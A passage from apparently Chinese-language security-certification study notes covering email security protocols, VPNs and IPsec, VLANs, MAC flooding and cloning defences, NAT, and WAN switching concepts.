地址，但是没有实际分配给物理服务器，而是将通信负载均衡调度的形式分配给另一组IP地址上运行的实际系统。</p><p>用户 -&gt; VIP -&gt; RS IP（真实系统IP）</p><p><strong>持久性&#x2F;一致性</strong> 客户端与负载均衡集群建立会话时，来自同一客户端的后续通信将被发送到同一服务器，从而支持通信的持久性或一致性。</p><h2 id="12-5-2-主动-主动与主动-被动"><a href="#12-5-2-主动-主动与主动-被动" class="headerlink" title="12.5.2 主动-主动与主动-被动"></a>12.5.2 主动-主动与主动-被动</h2><p>主动-主动（active - active）系统是一种负载均衡形式，在正常操作期间使用所有的可用路径或系统。</p><p>如果一个或多个出现故障，则由其他的承担所有负载。</p><p>常用于提供最大负载（优化可用性），可以容忍可用性降低时。</p><p>主动-被动（active-passive）系统是另一种负载均衡形式，在正常操作期间使某些路径或系统处于未使用的休眠状态。</p><p>如果一个或多个出现故障，则由被动元素联机并接管故障元素的工作负载。</p><p>常用于保持可用性一致时。</p><h1 id="12-6-管理电子邮件安全"><a href="#12-6-管理电子邮件安全" class="headerlink" title="12.6 管理电子邮件安全"></a>12.6 管理电子邮件安全</h1><p>邮件基础设施</p><ul><li>邮件服务器，使用 SMTP （simple mail transfer protocol，简单邮件传输协议，TCP 25 端口）接收来自客户的邮件，并将邮件传输给其他服务器。</li><li>邮件客户端，使用 POP3 （Post Office Protocol version 3，TCP 110 端口）或 IMAP （Internet Message Access Protocol，V4，TCP 143端口）从邮件服务器的收件箱中查收邮件。</li></ul><p>常见 SMTP 服务器</p><ul><li>Sendmail UNIX 系统中最常见的 SMTP 服务器</li><li>Exchange 微软系统中最常见的 SMTP 服务器</li></ul><p>邮件中继系统</p><p>​用于将邮件从发送者传递到接收者</p><p>​接收并转发邮件前不对发送者进行验证，则会成为一台“开放中继”（也称为“开放中继代理”或“中继代理”）。攻击者可以通过尾随（piggybacking）技术发送海量邮件。</p><p>SaaS 邮件解决方案</p><p>​优点：</p><p>​高可用性、分布式架构、易于访问、标准化配置以及物理位置独立。</p><p>​</p><p>​风险点：</p><p>​阻止名单问题、速度限制、app&#x2F;插件限制等</p><h2 id="12-16-1-电子邮件安全目标"><a href="#12-16-1-电子邮件安全目标" class="headerlink" title="12.16.1 电子邮件安全目标"></a>12.16.1 电子邮件安全目标</h2><h3 id="提供邮件安全性措施"><a href="#提供邮件安全性措施" class="headerlink" title="提供邮件安全性措施"></a>提供邮件安全性措施</h3><ul><li>消息只有收件人可以访问（即隐私与保密性）</li><li>维护消息的完整性</li><li>身份认证和验证消息源</li><li>提供不可否认性</li><li>验证消息的传递</li><li>对消息或附件中的敏感内容进行分级</li></ul><p>电子邮件的安全源于高层管理者批准的安全策略。</p><h3 id="安全策略需要解决的问题"><a href="#安全策略需要解决的问题" class="headerlink" title="安全策略需要解决的问题"></a>安全策略需要解决的问题</h3><h4 id="可接受的邮件使用策略"><a href="#可接受的邮件使用策略" class="headerlink" title="可接受的邮件使用策略"></a>可接受的邮件使用策略</h4><p>明确组织的邮件基础设施中，哪些活动是被允许的，哪些活动是被禁止的</p><p>对以下几种类型的邮件做专门限制：</p><ul><li>与个人事务（为其他组织工作，包括为自己工作）有关的邮件</li><li>发送与接收不合法的、不道德的以及冒犯性邮件</li><li>涉及影响组织利润、工作以及公共关系的活动邮件</li></ul><h4 id="访问控制和隐私"><a href="#访问控制和隐私" class="headerlink" title="访问控制和隐私"></a>访问控制和隐私</h4><p>目的在于限制用户只能访问各自收件箱及存档数据库信息。</p><p>访问控制既要保护合法访问，也要保护一定的隐私。</p><h4 id="邮件管理"><a href="#邮件管理" class="headerlink" title="邮件管理"></a>邮件管理</h4><p>应该明确组织中用于实现、维护及管理邮件的制度和流程。</p><h4 id="邮件备份与保留策略"><a href="#邮件备份与保留策略" class="headerlink" title="邮件备份与保留策略"></a>邮件备份与保留策略</h4><p>如果邮件要进行存档（也就是备份和存储），需要告知用户。</p><p>如果审计人员需要检查邮件是否违规，需要告知用户。</p><h2 id="12-6-2-理解电子邮件安全问题"><a href="#12-6-2-理解电子邮件安全问题" class="headerlink" title="12.6.2 理解电子邮件安全问题"></a>12.6.2 理解电子邮件安全问题</h2><p>支持邮件的标准协议（如 SMTP、POP 及 IMAP）都未采用本地加密措施，信息以原始形式（通常是明文）提交给邮件服务器进行传输，容易被拦截和窃听。</p><p>邮件时较常见的传播病毒、蠕虫、特洛伊木马、文档宏病毒及其他恶意代码的途径。</p><p>邮件很少进行本地源验证，存在伪造的风险；缺乏本地完整性检查机制，无法确认消息在发送过程中是否被改动过。</p><p>邮件本身存在产生 拒绝服务（DoS）攻击的风险，也被称为邮件炸弹，消耗系统的存储容量或处理器时间，导致无法传送合法的邮件。邮件风暴。</p><p>垃圾邮件，发送无用的、不合适的或无关的邮件的行为被称为垃圾邮件（spamming）攻击。浪费本地及互联网资源。难以防范，由于来源时虚假的。</p><h2 id="12-6-3-电子邮件安全解决方案"><a href="#12-6-3-电子邮件安全解决方案" class="headerlink" title="12.6.3 电子邮件安全解决方案"></a>12.6.3 电子邮件安全解决方案</h2><h3 id="安全-多用途互联网邮件扩展-S-MIME"><a href="#安全-多用途互联网邮件扩展-S-MIME" class="headerlink" title="安全&#x2F;多用途互联网邮件扩展 S&#x2F;MIME"></a>安全&#x2F;多用途互联网邮件扩展 S&#x2F;MIME</h3><p>安全&#x2F;多用途互联网邮件扩展（Secure Multipurpose Internet Mail Extensions，S&#x2F;MIME）</p><p>一种邮件安全标准，通过公钥加密、数字信封及数据签名为邮件提供身份认证和保密性保护。</p><p>身份认证是通过受信任的第三方 CA 发布的 X.509 数字证书完成。</p><p>隐私保护是通过符合公钥加密标准（Public Key Cryptography Standard，PKCS）的加密技术。</p><p>S&#x2F;MIME 形成两种类型的消息：</p><ul><li><p>签名消息</p><p>提供完整性、发件人身份认证及不可否认性</p></li><li><p>安全信封消息</p><p>提供收件人身份认证和保密性</p></li></ul><h3 id="良好隐私-PGP"><a href="#良好隐私-PGP" class="headerlink" title="良好隐私 PGP"></a>良好隐私 PGP</h3><p>良好隐私（Pretty Good Privacy，PGP）</p><p>一种基于点对点对称密钥的邮件系统，使用大量的加密算法加密文件及邮件消息。</p><p>不止一种标准，而是单独的软件产品</p><h3 id="域名关键字标识邮件-DKIM"><a href="#域名关键字标识邮件-DKIM" class="headerlink" title="域名关键字标识邮件 DKIM"></a>域名关键字标识邮件 DKIM</h3><p>域名关键字标识邮件（DomainKeys Identified Mail，DKIM）</p><p>通过验证域名标识来确定来自组织的邮件是否有效。</p><h3 id="发件人策略框架-SPF"><a href="#发件人策略框架-SPF" class="headerlink" title="发件人策略框架 SPF"></a>发件人策略框架 SPF</h3><p>发件人策略框架（Sender Policy Framework，SPF）</p><p>通过为 SMTP 服务器配置 SPF 来防止垃圾邮件及邮件欺骗。</p><p>通过检查发送消息的主机是否获得 SMTP 域名拥有者的授权，来确定消息的有效性。</p><h3 id="域消息身份认证报告和一致性-DMARC"><a href="#域消息身份认证报告和一致性-DMARC" class="headerlink" title="域消息身份认证报告和一致性 DMARC"></a>域消息身份认证报告和一致性 DMARC</h3><p>域消息身份认证报告和一致性（Domain Message  Authentication Reporting and  Conformance，DMARC）</p><p>基于 DNS 的电子邮件身份认证系统。</p><p>旨在防止商业电子邮价泄漏（BEC）、网络钓鱼和其他电子邮件欺诈行为。</p><p>基于 DNS 的说明验证接收到的消息是否有效，如果无效，则可以丢弃、隔离或发送电子邮件。</p><h3 id="STARTTLS"><a href="#STARTTLS" class="headerlink" title="STARTTLS"></a>STARTTLS</h3><p>STARTTLS（又名显示 TLS 或 SMTP 的投机 TLS）尝试在支持 TLS 的情况下与目标电子邮件服务器建立加密连接。</p><p>STARTTLS 是一个 SMTP 命令，而不是一个协议。</p><p>建立 SMTP 连接后，通过 STARTTLS 命令验证目标系统是否支持  TLS ，如果支持，则协商加密通道，如果不支持，则保持明文传输。</p><p>STARTTLS 的安全会话在  TCP  587 端口上进行。</p><h3 id="隐式-SMTPS"><a href="#隐式-SMTPS" class="headerlink" title="隐式 SMTPS"></a>隐式 SMTPS</h3><p>SMTP 的 TLS 加密形式，如果目标服务器支持 TLS ，则协商加密会话，如果不支持，连接将终止。</p><p>SMTPS  通信使用 TCP  465 端口。</p><p>数字签名有助于消除身份假冒。</p><p>消息加密科减少窃听事件发生。</p><p>邮件过滤可将垃圾邮件及邮件炸弹将至最少。</p><p><strong>邮件网关</strong></p><p>网络邮件网关拦截附件，可以消除来自恶意附件的威胁</p><p>可以 100% 拦截，也可以只拦截已知或疑似恶意的附件</p><p>对用户进行安全意识培训（避免下载或点击可疑、未知的附件）并采用杀毒软件（对已知的恶意代码有效，新病毒和未知变体作用有限）进行防护。</p><p>恶意邮件域名&#x2F;IP地址列表阻止机制，自动丢弃匹配的消息</p><p>采用挑战-应答过滤器，全新或未知地址邮件，自动回复一份请求确认的消息，如果是正常发送者会应答，垃圾邮件或自动发送的邮件则不会应答。</p><h2 id="12-6-4-传真安全"><a href="#12-6-4-传真安全" class="headerlink" title="12.6.4 传真安全"></a>12.6.4 传真安全</h2><h3 id="安全措施"><a href="#安全措施" class="headerlink" title="安全措施"></a>安全措施</h3><p>传真机加密：使用加密协议，对发出的传真信号进行打乱处理。</p><p>链路加密：使用一条加密的通信路径（类似于 VPN 线路或安全电话线）来发送传真。</p><p>活动日志以及异常报警：用于探测传真活动中可能是攻击行为的异常事件。</p><p>关闭传真机的自动打印功能，避免传真机在内存或本地存储设备上保留副本。</p><h1 id="12-7-虚拟专用网"><a href="#12-7-虚拟专用网" class="headerlink" title="12.7 虚拟专用网"></a>12.7 虚拟专用网</h1><p>VPN（virtual private network，虚拟专用网）是两个实体之间跨越不可信网络建立的通信通道。</p><p>VPN提供的关键安全功能：访问控制、身份认证、机密性和完整性。</p><p>VPN 常见场景：</p><p>专用网络内部终端用户之间</p><p>同一 ISP 的终端用户之间</p><p>可以连接两个网络</p><p>可以连接两个单独网络</p><p>可以连接客户端、服务器、路由器、防火墙和交换机</p><p>可以为使用有风险或脆弱通信协议的老旧应用提供安全防护</p><p>提供保密性及完整性保护</p><p>不提供也不保证可用性</p><p>绕过一些服务对位置的要求，并提供一定程度的匿名使用机制（有时候有问题）</p><p><strong>VPN 网关</strong></p><p>专用硬件设备，用于支持大量同步 VPN 连接，为安全的 VPN 连接提供高可用性、高扩展性和高性能。</p><p>也被称为 VPN 集中器、VPN 服务器、VPN 防火墙、VPN 远程访问服务器（RAS）、VPN 设备、VPN 代理或 VPN 装置。</p><h2 id="12-7-1-隧道技术"><a href="#12-7-1-隧道技术" class="headerlink" title="12.7.1 隧道技术"></a>12.7.1 隧道技术</h2><p>隧道技术（tunneling）是一种网络通信过程，通过将协议数据包封装到另一种协议报文中，对协议数据内容进行保护。</p><p>VPN 的协议作用类似于一个安全信封，提供特殊的传递能力（例如通过 Internet ）以及安全机制（例如数据加密）。</p><p>隧道技术通过采用中间网络对合法通过的协议进行封装，以保护内部协议及流量数据的安全。如果主要协议不可路由，也可使用隧道技术，将网络中支持的协议数量将至最少。</p><p>封装过程中会用到加密技术，所以借助隧道技术，能通过不可信网络来传输敏感数据。</p><p>隧道技术是一种低效的通信方式，使用多种协议，会增加消息通信的额外开销。同时，隧道技术增加了报文的体量和数量，相应的消耗了更多网络带宽。</p><p>隧道是一种点对点的通信机制，并不是用来处理广播流量。</p><p>由于隧道技术导致流量被加密，导致防火墙、入侵检测系统、恶意软件扫描仪或其他安全机制不可查看、访问、扫描或过滤 VPN 传输的数据。为确保使安全机制生效，需要将安全机制放置在 VPN 隧道之外。</p><h2 id="12-7-2-VPN-的工作机理"><a href="#12-7-2-VPN-的工作机理" class="headerlink" title="12.7.2 VPN 的工作机理"></a>12.7.2 VPN 的工作机理</h2><p>可以在其他任何网络连接上建立起 VPN 链路。</p><p>VPN 链路可能受到中间网络的速度以及客户系统与服务器系统间连接类型的限制。</p><p>VPN 能连接两个单独的系统或两个完整的网络，传输的数据只有在 VPN 隧道中才得到保护。</p><h3 id="VPN-运行模式"><a href="#VPN-运行模式" class="headerlink" title="VPN 运行模式"></a>VPN 运行模式</h3><h4 id="传输模式"><a href="#传输模式" class="headerlink" title="传输模式"></a>传输模式</h4><p>仅为有效负载提供加密保护，原始消息头保持不变。</p><p><img src="/./../12-%E5%9F%9F4%E9%80%9A%E4%BF%A1%E4%B8%8E%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8-%E9%80%9A%E4%BF%A1%E4%B8%8E%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/image-20250316222911053.png" alt="image-20250316222911053"></p><p>建议在单个系统之间的可信网络中使用。</p><h4 id="隧道模式"><a href="#隧道模式" class="headerlink" title="隧道模式"></a>隧道模式</h4><p>封装整个原始 LAN 协议数据包并添加自己的临时 IPsec 头，为有效负载和消息头提供加密保护</p><p><img src="/./../12-%E5%9F%9F4%E9%80%9A%E4%BF%A1%E4%B8%8E%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8-%E9%80%9A%E4%BF%A1%E4%B8%8E%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/image-20250316223131550.png" alt="image-20250316223131550"></p><p>需要跨越不受信任的网络或链接到来自多个系统时，使用隧道模式。</p><p>广域网（WAN）是一种远距离网络。</p><p>城域网（MAN）是一个城镇或城市内的网络。</p><p>校域网（CAN）是大学校园或商业园区内的网络。</p><p>VPN 可以在任何类型的网络上使用。</p><h2 id="12-7-3-始终在线-VPN"><a href="#12-7-3-始终在线-VPN" class="headerlink" title="12.7.3 始终在线 VPN"></a>12.7.3 始终在线 VPN</h2><p>始终在线 VPN（always-on VPN）是指每当网络链接处于活动状态时，尝试自动连接到 VPN 服务的 VPN 。</p><h2 id="12-7-4-分割隧道与全隧道"><a href="#12-7-4-分割隧道与全隧道" class="headerlink" title="12.7.4 分割隧道与全隧道"></a>12.7.4 分割隧道与全隧道</h2><p>分割隧道（spilt tunnel）是一种 VPN 配置，允许 VPN 连接的客户端系统（即远程节点）同时通过 VPN 和互联网直接访问组织网络。</p><p>分割隧道存在一定安全风险，可以从互联网通过客户端连接到 LAN。</p><p>全隧道（full tunnel）是另一种 VPN 配置，客户端所有流量都通过 VPN 链路发送到组织网络。</p><p>全隧道确保所有流量都由组织网络的安全基础设施过滤和管理。</p><h2 id="12-7-5-常用的-VPN-协议"><a href="#12-7-5-常用的-VPN-协议" class="headerlink" title="12.7.5 常用的 VPN 协议"></a>12.7.5 常用的 VPN 协议</h2><p>VPN 既有软件实现方案，也有硬件的实现方案。</p><h3 id="点对点隧道协议-PPTP"><a href="#点对点隧道协议-PPTP" class="headerlink" title="点对点隧道协议 PPTP"></a>点对点隧道协议 PPTP</h3><p>PPTP（Point-to-Point Tunneling Protocol，点对点隧道协议）是一种在拨号点对点协议基础上开发的淘汰的封装协议。</p><p>运行在 OSI 参考模型的数据链路层（第 2 层），用于 IP 网络</p><p>PPTP 使用 TCP 1723 端口</p><p>PPTP 通过 PPP 同样支持的身份认证协议，为身份认证流量提供保护。</p><ul><li>密码身份认证协议（PAP）</li><li>征询握手身份认证协议（CHAP）</li><li>可扩展身份认证协议（EAP）</li><li>微软的征询握手身份认证协议（MS- CHAPv2）</li></ul><h3 id="第-2-层隧道协议（L2TP）"><a href="#第-2-层隧道协议（L2TP）" class="headerlink" title="第 2 层隧道协议（L2TP）"></a>第 2 层隧道协议（L2TP）</h3><p>第 2 层隧道协议（Layer 2 Tunneling Protocol，L2TP）是结合 PPTP 和 Cisco 的第 2 层转发（L2F）VPN 协议的特点开发。</p><p>L2TP 在第 2 层运行，可以支持任何第 3  层网络协议。</p><p>L2TP 使用 UDP 1701 端口。</p><p>不提供本地加密，支持有效负载加密协议的使用。</p><h3 id="SSH"><a href="#SSH" class="headerlink" title="SSH"></a>SSH</h3><p>Secure Shell（SSH）是 Telnet（TCP 23 端口）和许多 UNIX “r” 工具（例如：rlogin、rsh、rexec 和 rcp）的安全替代品。</p><p>Telnet 提供对系统的明文远程访问。</p><p>所有 SSH 传输（身份认证和数据交换）都是加密的。</p><p>SSH 通过 TCP 22 端口运行。</p><p>大多数安全协议，如果名称中的 S 是前缀，如 SFTP，则加密由 SSH 提供。如果名称中的 S 是后缀，如 HTTPS ，则加密由 TLS 提供。</p><h3 id="OpenVPN"><a href="#OpenVPN" class="headerlink" title="OpenVPN"></a>OpenVPN</h3><p>OpenVPN 基于 TLS 提供的一个易于配置但安全可靠的 VPN 选项。</p><p>一种开源实现，可以使用预共享密码或证书进行身份认证。</p><h2 id="IP-安全协议"><a href="#IP-安全协议" class="headerlink" title="IP 安全协议"></a>IP 安全协议</h2><p>互联网协议安全（Internet Protocol Security，IPsec）是 IP 安全扩展的标准。</p><p>IPv4 的附加组件，集成到 IPv6 中。</p><p>主要用途是在内部和&#x2F;或外部主机或网络之间建立 VPN 链路。</p><p>IPsec 仅在 IP 网络上工作，并提供安全身份认证和加密数据传输。</p><p>IPsec 不是单个协议，而是一组协议，包括 AH、ESP、HMAC、IPComp 和 IKE。</p><ul><li><p><strong>身份认证头（Authentication Header，AH）</strong>提供消息完整性和不可否认性，提供主要身份认证功能，实现会话访问控制，防止重放攻击。</p></li><li><p><strong>封装安全载荷（Encapsulating Security Payload，ESP）</strong>可以提供有效负载内容的保密性和完整性。</p><p>提供加密、有限的身份认证，防止重放攻击。</p><p>使用高级加密标准（AES）加密。</p><p>ESP 可以运行在传输模式或隧道模式下。</p></li><li><p><strong>基于哈希的消息身份认证码（Hash- based Message Authentication Code，HMAC）</strong>是 IPsec 使用的主要哈希校验或完整性检查机制。</p></li><li><p><strong>IP 有效负载压缩（IP Payload Compression，IPComp）</strong>IPsec 使用的一种压缩工具，用于在 ESP 加密前进行压缩，提升传输速率。</p></li></ul><p>IPsec 使用公钥加密和对称加密来提供加密（也称为混合加密）、安全密钥交换、访问控制、不可否认性和消息身份认证。</p><p>IPsec 管理加密密钥的机制是互联网密钥交换（Internet Key Exchange，IKE）。</p><p>IKE 元素：</p><ul><li>OAKLEY，一种密钥生成和交换协议</li><li>SKEME，安全密钥交换机制（Secure Key Exchange Mechanism），类似于数字信封。</li><li>ISAKMP，互联网安全关联和密钥管理协议（Internet Security Association and Key Management Protocol）用于组织和管理 OAKLEY 和 SKEME 生成和交换的加密密钥。</li></ul><h1 id="12-8-交换与虚拟局域网"><a href="#12-8-交换与虚拟局域网" class="headerlink" title="12.8 交换与虚拟局域网"></a>12.8 交换与虚拟局域网</h1><p>交换机是最常见的网络管理设备。</p><p>交换机主要在第 2 层运行，出于特殊目的，可能配备在第 3 层（或更高层）运行。</p><h2 id="交换机主要功能"><a href="#交换机主要功能" class="headerlink" title="交换机主要功能"></a>交换机主要功能</h2><p>学习、转发、丢弃和泛洪。</p><p>学习模式是交换机了解其本地网络的方式。</p><p>对每个接收到的入站以太网帧进行评估。</p><p>首先，根据内容寻址内存 CAM 表检查源 MAC 地址，如果不在  CAM 表中，则添加该地址。</p><p>其次，根据 CAM 表检查目标 MAC 地址，如果地址存在，则将表中的出口端口与接收当前以太网帧的端口进行比对。如果端口号不同，则将帧从出口转发出去，如果端口号相同，则丢弃该帧。</p><p>如果目标 MAC 地址没有在 CAM 表中，则将帧从所有端口发送出去。</p><p>内容寻址内存（CAM）表，保存在交换机内存中，包含 MAC 地址和端口号之间的映射。</p><h3 id="虚拟局域网-VLAN"><a href="#虚拟局域网-VLAN" class="headerlink" title="虚拟局域网 VLAN"></a>虚拟局域网 VLAN</h3><p>VLAN（virtual local area network，虚拟局域网）是一种在交换机上通过硬件实现的网络分段技术。</p><p>默认条件下，交换机上所有端口都属于 VLAN1，VLAN1 是管理流量 VLAN。</p><p>VLAN 用于流量管理，是网络分段的一种形式，网段的存在是为控制其中的流量，并组织试图进出的流量。</p><p>VLAN 有助于控制和限制广播流量，由于交换机将每个 VLAN 视为分离的网络分区，能减少流量嗅探的风险。</p><p>VLAN 间路由功能可以组织  VLAN 间以太网广播的特点，有助于防止广播风暴（broadcast storm，大量以太网广播垃圾流量）</p><p>“VLAN 管理”利用 VLAN 进行流量控制，以满足安全或性能要求。</p><p>VLAN 隔离不同网段之间流量的方式：</p><ul><li>不同 VLAN 之间不提供路由功能。</li><li>特定的 VLAN（或 VLAN 的成员）之间设置拒绝过滤策略。</li></ul><p><strong>拒绝是常态，允许是例外。</strong></p><p>VLAN 是交换机创建的，子网是通过 IP 地址及子网掩码配置的。</p><h3 id="交换机窃听"><a href="#交换机窃听" class="headerlink" title="交换机窃听"></a>交换机窃听</h3><p>端口镜像：从一个或多个其他端口复制特定端口的流量。</p><p>交换端口分析器（Switched Port Analyzer，SPAN）端口，用于复制所有其他端口的流量，或者将任何端口配置为一个或多个其他端口的镜像、审核、IDS 或监控端口。</p><p>端口监听（port tap）是网络通信窃听的一种手段。</p><p>通过中继端口将多个交换机连接。</p><p>VLAN 标签修改以太网帧头的标准构造，以将 VLAN 标记值纳入其中。</p><p><strong>虚拟化网络或网络虚拟化</strong>是指将硬件和软件网络组件组合成单个集成实体，允许对所有网络功能进行软件控制：管理、流量整形、地址分配等。</p><h2 id="MAC-泛洪攻击"><a href="#MAC-泛洪攻击" class="headerlink" title="MAC 泛洪攻击"></a>MAC 泛洪攻击</h2><p>MAC 泛洪攻击（MAC flooding）攻击是指故意滥用交换机的学习功能，使其陷入泛洪状态。</p><h3 id="MAC-泛洪攻击原理"><a href="#MAC-泛洪攻击原理" class="headerlink" title="MAC 泛洪攻击原理"></a>MAC 泛洪攻击原理</h3><p>发送带有随机源 MAC 地址的以太网帧淹没交换机实现。</p><p>1、交换机将尝试把每个新发现的源 MAC 地址添加到其内容寻址内存（CAM）表中。</p><p>2、CAM 表满后，由于是先进先出&#x2F;FIFO队列，所以旧条目被删除，为新条目腾出空间。</p><p>3、一旦 CAM 中只有错误地址，交换机将无法正确转发通信量，会返回泛洪模式。</p><h3 id="防御-MAC-泛洪攻击措施"><a href="#防御-MAC-泛洪攻击措施" class="headerlink" title="防御 MAC 泛洪攻击措施"></a>防御 MAC 泛洪攻击措施</h3><p>MAC 限制（MAC limiting），限制从每个插孔或端口进入 CAM 表中的 MAC 地址数。</p><p>网络入侵检测系统（NIDS）也可用于识别正在尝试的 MAC 泛洪攻击。</p><h2 id="MAC-克隆"><a href="#MAC-克隆" class="headerlink" title="MAC 克隆"></a>MAC 克隆</h2><p>在同一本地以太网广播域中，两个设备不能具有相同的 MAC 地址，否则将发生地址冲突。</p><p>MAC 克隆用于模拟另一系统（通常是有效或授权的网络设备），以绕过端口安全或 MAC 过滤限制。</p><p>MAC 过滤是一种安全机制，旨在限制对具有已知特定 MAC 地址的设备的网络访问。</p><p>MAC 过滤通常用于 WAP 和交换机。</p><p>MAC 欺骗&#x2F;克隆的对策包括：</p><ul><li>使用智能交换机监控奇怪 MAC 地址的使用和滥用</li><li>使用 NIDS 监控奇怪 MAC 地址的使用和滥用</li><li>维护设备及其 MAC 地址的清单，以确认设备是否为已授权、未知或恶意的。</li></ul><h1 id="12-9-网络地址转换"><a href="#12-9-网络地址转换" class="headerlink" title="12.9 网络地址转换"></a>12.9 网络地址转换</h1><p>NAT（network address translation，网络地址转换）可以实现：</p><ul><li>隐藏内部用户的身份</li><li>屏蔽私有网络的设计</li><li>降低公共 IPv4 地址的租用费用</li></ul><p>NAT 的好处：</p><ul><li>利用 NAT ，整个网络可通过共享一个（或一些）公共 IPv4 地址接入互联网</li><li>可在内部网中使用 RFC 1918 中定义的私有 IPv4 地址，同时仍能与互联网进行通信。</li><li>通过 NAT 向外隐藏内部 IPv4 地址的划分及网络拓扑</li><li>NAT 对连接做限制，来自互联网的流量中，只有网络内部受保护连接的流量才被允许通过</li><li>NAT 作为基本的单向防火墙，只允许响应内部系统请求的传入流量</li></ul><p>PAT：端口地址转换（port address translation），也被称为超载 NAT，IT行业中 NAT &#x3D;&#x3D; PAT。</p><p>NPAT：网络与端口地址转发（network and port address translation，NPAT）</p><p>NAPT：网络地址与端口转发（network address and port translation，NAPT）</p><p>SNAT：源网络地址转换（source network address translation）</p><p>NAT 称为状态 NAT 或动态 NAT，因为映射和 IPv4 地址&#x2F;套接字分配是在会话启动时创建的，会话中断时则会解散。</p><p>NAT-T 专门用于支持 IPsec 和其他隧道 VPN 协议，如第 2 层隧道协议（L2TP）。</p><p>NAT 默认时一种动态出站映射机制，也可以被设置为入站映射。</p><p>入站映射被称为静态 NAT、反向代理、端口转发或目标网络地址转换（DNAT），<strong>该方案需要避免，不是一个安全的解决方案</strong>。</p><p>NAT 不与 IPv6 一起使用。</p><h2 id="12-9-1-私有-IP-地址"><a href="#12-9-1-私有-IP-地址" class="headerlink" title="12.9.1 私有 IP 地址"></a>12.9.1 私有 IP 地址</h2><p>IPv4 最多只有大约 40 亿（2 的 32 次方）个可用地址。</p><p>私有IP地址段：</p><ul><li>10.0.0.0 到 10.255.255.255（全 A 类地址）</li><li>172.16.0.0 到 172.31.255.255（16 个 B 类地址）</li><li>192.168.0.0 到 192.168.255.255（256 个 C 类地址）</li></ul><p><strong>不能反复使用 NAT</strong></p><p><strong>私有 IPv4 地址在默认情况下是不可路由的。</strong></p><h2 id="12-9-2-状态-NAT"><a href="#12-9-2-状态-NAT" class="headerlink" title="12.9.2 状态 NAT"></a>12.9.2 状态 NAT</h2><p>NAT 维护了内部用户请求、内部用户 IP 地址以及互联网服务 IP 地址之间的映射表。</p><p>状态 NAT 过程</p><p>内部请求 -&gt; 源地址转换为服务器地址 -&gt; 保存更改信息与目标地址</p><p>外部回复 -&gt; 源地址与保存地址比对 -&gt; 回复信息转发给接收者</p><h2 id="12-9-3-自动私有-IP-分配"><a href="#12-9-3-自动私有-IP-分配" class="headerlink" title="12.9.3 自动私有 IP 分配"></a>12.9.3 自动私有 IP 分配</h2><p>自动私有 IP 分配（Automatic Private IP Addressing，APIPA）也被称为本地链路地址分配。</p><p>在动态主机配置协议（Dynamic Host Configuration Protocol，DHCP）分配失败的情况下继续为系统分配 IP 地址。</p><p>地址范围：169.254.0.1 到 169.254.255.254，和 B 类子网掩码 255.255.0.0。</p><p>环回地址（loopback address）：127.x.x.x</p><h1 id="12-10-第三方连接"><a href="#12-10-第三方连接" class="headerlink" title="12.10 第三方连接"></a>12.10 第三方连接</h1><p>大多数外部实体不需要直接与组织的 IT &#x2F; IS 进行交互。</p><p>谅解备忘录（MOU）或协议备忘录（MOA）是两个实体之间协议或一致意向、意愿活目的的表达。是一种记录双方之间协议或安排细节的方法。</p><p>互联安全协议（interconnection  security agreement，ISA）是两个组织的 IT 基础设施之间链路的安全态度、风险和技术要求的正式声明。</p><h2 id="直接链接-IT-环境的解决方案"><a href="#直接链接-IT-环境的解决方案" class="headerlink" title="直接链接 IT 环境的解决方案"></a>直接链接 IT 环境的解决方案</h2><p>1、使用外部网托管服务器，另一方通过 VPN 访问服务器。</p><p>2、与云解决方案合作，在两个实体之间建立共享私有云，以使双方仅共享与项目相关的内容。</p><p>3、将所有数据分开，并使用安全电子邮件、文件共享和多媒体协作服务。</p><p>第三方连接是一种可以管理的风险，需要有针对性的关注。</p><p>任何数据传输或通信手段都可能被良性行为者用于合法目的，也可能被对手用于恶意目的。</p><h1 id="12-11-交换技术"><a href="#12-11-交换技术" class="headerlink" title="12.11 交换技术"></a>12.11 交换技术</h1><h2 id="12-11-1-电路交换"><a href="#12-11-1-电路交换" class="headerlink" title="12.11.1 电路交换"></a>12.11.1 电路交换</h2><p>电路交换（circuit switching）最初旨在管理公用电话交换网络中的电话呼叫。</p><p>电路交换保持了通话质量的一致性、很小的信号损失、几乎不发生通信中断。</p><p>电路交换系统提供的是永久物理连接。永久表示每次通信会话使用相同的物理或电子路径，且改路径只为当前通信服务。</p><h2 id="12-11-2-分组交换"><a href="#12-11-2-分组交换" class="headerlink" title="12.11.2 分组交换"></a>12.11.2 分组交换</h2><p>分组交换（packet switching）技术将信息或通信内容分成很小的段（固定长度单元或可变长度数据包，具体数值取决于所使用的技术和协议），并通过中间网络将这些分组传送到目的地。</p><p>每段数据包都由 头部（包含源地址和目的地址信息）+数据段 构成，中间系统通过分析头部信息，选择合适的路径将 数据段 发送给接收者。</p><p>分组交换并不强行独占通信路径。</p><p><img src="/./../12-%E5%9F%9F4%E9%80%9A%E4%BF%A1%E4%B8%8E%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8-%E9%80%9A%E4%BF%A1%E4%B8%8E%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/image-20250319142034486.png" alt="image-20250319142034486"></p><p><strong>交换分组存在的安全风险</strong></p><ul><li>泄漏</li><li>破坏</li><li>窃听</li></ul><p><strong>交换分组安全措施</strong></p><ul><li>连接管理</li><li>流量隔离</li><li>加密技术</li></ul><p>交换分组优点：</p><ul><li>不强依赖特定的物理连接</li></ul><h2 id="12-11-3-虚电路"><a href="#12-11-3-虚电路" class="headerlink" title="12.11.3 虚电路"></a>12.11.3 虚电路</h2><p>虚电路（也称为通信路径）是一条逻辑路径或电路，在分组交换网络两个特定端点之间建立。</p><p><strong>分组交换系统存在的虚电路类型</strong></p><ul><li>PVC（permanent virtual circuit，永久虚电路）</li><li>SVC（switched virtual circuit，交换式虚电路）</li></ul><p>PVC 是一种预定义虚电路，并一直可用，逻辑电路一直保持并时刻等待用户发送数据。</p><p>SVC 必须利用当前可用的最优路径建立虚电路，传输结束后，链路被拆除。</p><h1 id="12-12-WAN-技术"><a href="#12-12-WAN-技术" class="headerlink" title="12.12 WAN 技术"></a>12.12 WAN 技术</h1><p>WAN（wide area network，广域网）将远距离网络、节点或单独的设备连接起来。</p><p>WAN 链路能改善通信，提高效率。</p><h2 id="WAN-链路及长距离连接技术分类"><a href="#WAN-链路及长距离连接技术分类" class="headerlink" title="WAN 链路及长距离连接技术分类"></a><strong>WAN 